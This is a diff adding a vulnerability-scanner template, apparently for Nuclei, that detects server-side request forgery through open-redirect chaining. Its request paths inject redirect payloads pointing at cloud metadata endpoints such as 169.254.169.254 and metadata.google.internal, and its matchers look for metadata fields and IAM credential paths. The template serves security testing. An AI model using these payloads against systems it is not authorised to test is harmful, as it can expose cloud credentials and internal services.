@@ -1,0 +1,59 @@
+id: ssrf-redirect-chain
+
+info:
+  name: SSRF via Open Redirect Chain
+  author: chipo
+  severity: medium
+  description: |
+    Detects SSRF via open redirect chaining. Some applications validate that a redirect
+    target starts with a trusted domain but then follow the full redirect chain, which
+    can terminate at an attacker-controlled host. This template injects redirect payloads
+    targeting internal metadata endpoints (169.254.169.254, localhost, 0.0.0.0) and cloud
+    metadata services (AWS IMDSv1, GCP, Azure) to detect blind SSRF that surfaces through
+    redirect following.
+  reference:
+    - https://cwe.mitre.org/data/definitions/918.html
+    - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-bypass
+  metadata:
+    false-positive: |
+      Servers that return the redirect URL verbatim in the response body without following
+      it will match on body content but are not exploitable as SSRF. The high-signal
+      indicator is a 200 response body containing cloud metadata fields (instanceId,
+      ami-id, computeMetadata).
+    max-request: 8
+  tags: ssrf,redirect,cloud-metadata,aws,gcp,owasp-a10
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/redirect?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/redirect?url=http://0.0.0.0:80/"
+      - "{{BaseURL}}/redirect?url=http://localhost/admin"
+      - "{{BaseURL}}/redirect?url=http://[::1]/"
+      - "{{BaseURL}}/redirect?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/redirect?url=http://169.254.169.254/metadata/v1/"
+      - "{{BaseURL}}/fetch?resource=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/proxy?target=http://169.254.169.254/latest/meta-data/"
+
+    follow-redirects: true
+    max-redirects: 5
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "local-hostname"
+          - "computeMetadata"
+          - "instanceId"
+          - "subscriptionId"
+          - "placement/region"
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - "169\.254\.169\.254"
+          - "iam/security-credentials"
